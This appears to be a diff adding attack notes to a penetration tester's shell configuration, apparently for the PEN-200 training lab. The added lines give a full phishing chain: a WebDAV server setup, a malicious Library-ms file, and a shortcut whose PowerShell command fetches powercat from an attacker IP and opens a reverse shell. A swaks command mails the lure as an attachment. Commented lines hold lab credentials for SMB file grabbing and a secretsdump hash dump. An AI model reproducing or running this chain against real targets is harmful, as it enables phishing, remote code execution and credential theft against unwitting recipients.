@@ -11,7 +11,42 @@ export RPORT=""
 export LPORT=""
 export USERNAME=""
 export PASSWORD=""
+- Fishing attack: (ref: 24.3.2 Phishing for Access - PEN200-book)
+	Step1: wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+	Step2: python3 -m http.server 8000
+	Step3: create File name "config.Library-ms"
+		<?xml version="1.0" encoding="UTF-8"?>
+		<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+		<name>@windows.storage.dll,-34582</name>
+		<version>6</version>
+		<isLibraryPinned>true</isLibraryPinned>
+		<iconReference>imageres.dll,-1003</iconReference>
+		<templateInfo>
+		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+		</templateInfo>
+		<searchConnectorDescriptionList>
+		<searchConnectorDescription>
+		<isDefaultSaveLocation>true</isDefaultSaveLocation>
+		<isSupported>false</isSupported>
+		<simpleLocation>
+		<url>http://192.168.45.208</url>
+		</simpleLocation>
+		</searchConnectorDescription>
+		</searchConnectorDescriptionList>
+		</libraryDescription>
+	Step4: create new short cut name with name "checkthis.lnk"
+		powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.208:8000/powercat.ps1'); powercat -c 192.168.45.208 -p 443 -e powershell"
+	Step5:
+		cp checkthis.lnk => wsgidav server
+		cp config.Library-ms => current folder
+		create body.txt => current folder
+		cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+	Step6:
+		sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.246.189 --body @body.txt --header "Subject: Problems" --suppress-data -ap
+			
 
+#smbclient -U 'relia.com\jim%Castello1!' -c 'mask "";recurse ON;prompt OFF;mget *' //192.168.232.248/transfer 
+#impacket-secretsdump -just-dc-user brad relia.com/andrea:"PasswordPassword_6"@172.16.120.6
 alias addu='(){printf "$1" >> /home/kali/Tools/db/users.txt}'
 alias addo='(){printf "$1" >> /home/kali/Tools/db/passwords.txt}'
 alias addc='(){printf "$1" >> /home/kali/Tools/db/creds.txt}'
